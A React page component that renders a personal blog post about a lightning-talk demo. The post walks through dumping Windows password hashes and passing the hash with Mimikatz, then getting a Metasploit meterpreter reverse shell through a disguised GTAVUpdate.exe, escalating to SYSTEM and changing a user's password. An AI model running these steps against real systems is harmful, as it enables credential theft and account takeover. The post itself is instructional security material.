import { Container, Box } from '@mui/material'
import '../index.css'
import React from 'react'

const MimikatzPage = () => {
  return (
    <Container style={{ color: '#ffffff' }}>
      <h1 className='post-title'>Passing the Hash with Mimikatz</h1>
      <p>
        In this article, I'll walk you through how to use Mimikatz to obtain
        user passwords from a Windows machine. I'll also show you how to use 
        Mimikatz in order to perform an attack called passing the hash (pth) to
        escalate your privileges and impersonate a user. Also as a bonus, I'll
        show you how you can utilise both a Meterpreter reverse shell and a
        phishing attack in order to get the same outcome but without needing
        physical access to the target's machine.
      </p>

      <Box style={{ backgroundColor: 'white', color: 'black', padding: '10px 40px', borderRadius: '10px' }}>
        <h1>Reflection</h1>
        <p>
          From researching various topics about Mimikatz, passing the hash and
          Windows Defenders to ultimately doing a lightning talk (more like a lightning demo)
          about how to escalate privileges in Windows, I've learnt a lot about how
          powerful a tool Windows firewall is to detect malware like Mimikatz and how
          easy it was to hack someone's account when you have physical access (ie. GAME OVER!!!). The talk
          I did also spawned a couple of interesting questions about the validity of
          attacking a corporate network like how I demonstrated it. Spoiler alert:
          unless you have physical access to the network, you chances of you doing this is low.
          Even if you successfully manage to download Mimikatz, there are definitely going to be
          all sorts of red flags going off in the company's IT department.
        </p>
      </Box>
      <h3>Pre Set Up</h3>
      <ul>
        <li>A target (preferably with consent)</li>
        <li>A windows machine with multiple user account (peferably one which has admin access)</li>
        <li>The Windows Defender (aka Window's firewall) has been turned off</li>
        <li>Mimikatz (and metasploit if you are attempting the bonus feature) downloaded</li>
      </ul>


      <h3>The Simple Way</h3>
      <ol>
        <li>Log on as <span className='code-fragment'>FakeUser</span> and demonstrate that without system admin privilege, we can't change the password of another account.</li>
        <li>Launch Mimikatz as admin</li>
        <li>Use command <span className='code-fragment'>privilege::debug</span> to escalate privileges</li>
        <li>Use command <span className='code-fragment'>sekurlsa::logonpasswords</span> to dump all user passwords.</li>
        <li>Get the hash of the user we want to impersonate (in this case, it's <span className='code-fragment'>User</span>) and the domain of the <span className='code-fragment'>FakeUser</span> account.</li>
        <li>
          Use command:
          <pre><code>sekurlsa::pth /user:User /domain:[insert_user_domain_here] /ntlm:[insert_hash_here]</code></pre>
        </li>
        <li>A new console opens up.</li>
        <li>Demonstrate that the system thinks we are still <span className='code-fragment'>FakeUser</span> but we definitely are <span className='code-fragment'>User</span>.</li>
        <li>Now try changing the password and it will work.</li>
      </ol>

      <p>
        This is an pre-recording I did in case the lightning talk went sideways =)
        If you can't view the recording below, use this link instead:
        <br />
        <a href='https://youtu.be/MLizeTI0jr4' className='internal-post-link'>Mimikatz Video</a>
      </p>
      <iframe
        width="860"
        height="515"
        src="https://www.youtube.com/embed/MLizeTI0jr4"
        title="YouTube video player"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      >
      </iframe>

      <h3>Bonus: The Fancy Way</h3>
      <ol>
        <li>Launch Kali</li>
        <li>Open terminal and get IP using <pre><code>ip addr</code></pre></li>
        <li>Launch Metasploit using <pre><code>msfconsole</code></pre></li>
        <li>
          Use commands:
          <pre>
            <code>
              use multi/handler
              <br></br>
              set payload windows/meterpreter/reverse_tcp
              <br></br>
              set LHOST [IP address]
              <br></br>
              set LPORT 4444
            </code>
          </pre>
        </li>
        <li>Open another console and <span className='code-fragment'>cd /var/www/html</span></li>
        <li>Start the apache server using <span className='code-fragment'>service apache2 start</span></li>
        <li>Switch back to the meterpreter console and type <pre><code>exploit</code></pre></li>
        <li>Switch over to the Windows machine and talk about how a simple social engineering can be done to gain access.</li>
        <li>Once launch <span className='code-fragment'>GTAVUpdate.exe</span>, go back to Kali.</li>
        <li>Show that we are now impersonating this user by <span className='code-fragment'>getuid</span></li>
        <li>Escalate our privileges by <span className='code-fragment'>getsystem</span></li>
        <li>Show that we are now system admin by <span className='code-fragment'>getuid</span></li>
        <li>Load mimikatz using <span className='code-fragment'>load mimikatz</span></li>
        <li>Show that we can get user password ntlm hashes using <span className='code-fragment'>lsa_dump_sam</span></li>
        <li>Type in <span className='code-fragment'>shell</span></li>
        <li>This launches the shell and we can verify that we are system admin by <span className='code-fragment'>whoami</span></li>
        <li>Change password using <span className='code-fragment'>net user User hello</span></li>
      </ol>

    </Container>
  )
}

export default MimikatzPage